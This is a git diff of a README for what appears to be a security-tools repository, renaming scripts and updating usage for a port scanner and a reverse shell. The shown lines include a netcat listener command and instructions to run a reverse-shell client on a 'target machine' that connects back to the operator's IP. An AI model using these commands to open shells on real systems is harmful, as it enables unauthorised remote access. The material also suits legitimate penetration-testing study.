@@ -32,8 +32,9 @@ The creators of this repository do not take responsibility for any misuse of the
 
 ### Port Scanner
 ```bash
-python port_scanner.py <target_ip>
+python port-scanner.py
 ```
+The scanner works in interactive mode.
 
 ### Reverse Shell
 **Bind the reverse shell server on your machine:**
@@ -43,7 +44,7 @@ nc -lnvp <listener_port>
 
 **Run the reverse sheel on your target machine:**
 ```bash
-python reverse_shell_client.py <your_machine_ip> <listener_port>
+python reverse-shell-on-target.py <your_machine_ip> <listener_port>
 ```
 
 ---
